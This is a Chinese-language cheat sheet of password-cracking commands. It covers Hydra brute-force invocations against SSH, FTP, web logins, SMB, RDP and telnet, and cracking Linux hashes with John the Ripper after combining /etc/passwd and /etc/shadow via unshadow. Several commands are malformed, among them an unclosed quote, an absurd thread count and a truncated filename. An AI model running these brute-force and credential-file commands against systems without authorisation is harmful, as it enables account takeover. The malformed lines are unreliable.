# Crack
---
hydra 

Hydra –L 文件路径 –P 密码路径 t 线程 –vV 详细显示 –o 指定生成路径 –f 找到密码就停止 –e ns 空密码和指定密码试探 ip service 爆破服务

爆破ssh：

hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh

hydra -l 用户名 -p 密码字典 -t 线程 -o /1 -vV ip ssh

爆破ftp：

hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) –vV

hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV

爆破web登录(get)：

hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get/admin/

hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get/admin/index.PHP

爆破web登录(post)：

hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form"/admin/login.php:user

hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form"login.php:id=USER&passwd=PASS:"

https爆破：

hydra -m /index.php -l admin -P pass.txt 10.36.16.18 https

smb爆破：

hydra -l administrator -P pass.txt 10.36.16.18 smb

rdp爆破：

hydra -l administrator -P pass.txt –o /root/1 –V rdp://ip

telnet爆破：

hydra ip telnet -L 用户 -P 密码 -e ns -f -v -t 1000000000000000


---
John the Ripper

John the Ripper是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码。除了在各种Unix系统上最常见的几种密码哈希类型之外，它还支持Windows LM散列，以及社区增强版本中的许多其他哈希和密码。它是一款开源软件。Kali中自带John。

可执行文件位置：  /usr/sbin/john 

密码字典所在目录：/usr/share/john/ 

John the Ripper支持字典破解方式和暴力破解方式

破解Linux系统密码

破解Linux用户密码需要使用到两个文件（包含用户的信息和密码hash值）

/etc/passwd       包含用户信息的文件

/etc/shadow       包含密码信息的文件

创建一个 abc 用户，密码设置为 password ，用来测试



使用 unshadow 命令组合 /etc/passwd 和 /etc/shadow ，组合成 test_passwd 文件。其他 test_passwd 就是 /etc/passwd 和 /etc/shadow 的简单组合: 

unshadow  /etc/passwd  /etc/shadow >  test_passwd 

然后用 John 破解密码了。我们可以使用 John 自带的密码字典，位于 /usr/share/john/password.lst ，也可以使用我们自己的密码字典。用John自带的密码字典为例： 

john  test_passwd 

若使用自己的密码字典： 

john  --wordlist=字典路径    test_passw 

查看破解信息：

john  --show  test_passwd 

